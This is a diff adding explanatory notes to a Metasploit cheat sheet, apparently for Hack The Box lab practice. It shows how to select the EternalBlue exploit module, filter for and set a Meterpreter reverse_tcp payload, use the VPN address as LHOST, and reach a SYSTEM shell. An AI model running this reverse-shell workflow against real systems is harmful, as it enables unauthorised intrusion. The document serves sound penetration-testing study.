@@ -108,6 +108,7 @@ A **payload** in Metasploit is a module that aids the exploit in returning a she
 ```bash
 msf6 > show payloads
 ```
+> Lists every available payload. Run this inside a selected exploit module to see only compatible payloads for that target.
 
 ### Filter with grep (inside msfconsole)
 
@@ -121,6 +122,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloa
 # Chain grep for specific payload
 msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
 ```
+> Chain `grep` calls to narrow payload results. `-c` counts matches. The last example filters to only Meterpreter reverse TCP payloads — the most useful combination.
 
 ### Select a Payload
 
@@ -131,6 +133,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
 # By full name
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
 ```
+> Use the index from `show payloads` for speed, or type the full path for clarity. Always set the payload explicitly when the default may not match your target arch.
 
 > When `show payloads` is run inside an exploit module, MSF automatically filters to show only compatible payloads for the target OS.
 
@@ -171,6 +174,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpr
 msf6 > ifconfig
 # Shows all interfaces — look for tun0 (VPN) IP
 ```
+> Run `ifconfig` from inside msfconsole to confirm your attacker IP. Use the `tun0` address when on HTB VPN — that's what goes in `LHOST`.
 
 ---
 
@@ -201,6 +205,7 @@ meterpreter > shell
 C:\Users> whoami
 # nt authority\system
 ```
+> Full payload workflow: select exploit → filter payloads → set payload → configure RHOSTS/LHOST → run. `meterpreter > shell` drops into a native OS shell; `exit` returns to Meterpreter.
 
 ---
 
